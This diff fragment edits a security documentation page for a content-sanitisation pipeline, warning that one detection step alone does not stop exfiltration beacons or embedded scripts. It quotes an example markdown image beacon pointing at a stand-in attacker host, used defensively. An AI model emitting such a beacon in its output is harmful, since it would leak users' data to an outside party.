@@ -212,7 +212,7 @@ here are for a pipeline that runs outside the MCP handler boundary.
 
 > **⚠️ `sanitizeAndDetect` is not the full defence, and earlier releases of this
 > page said it was.** It is Step 2 of five. Steps 3–5 — markup-comment
-> stripping, the `<script>`/`<style>` fixed point, markdown beacon removal and
+> stripping, the `<script>`/`<style>` strip, markdown beacon removal and
 > the numeric-entity re-detect — are what remove exfiltration beacons like
 > `![x](https://attacker/?d=…)` and embedded script blocks. A channel running
 > Step 2 alone passes those through intact while looking defended. If you want
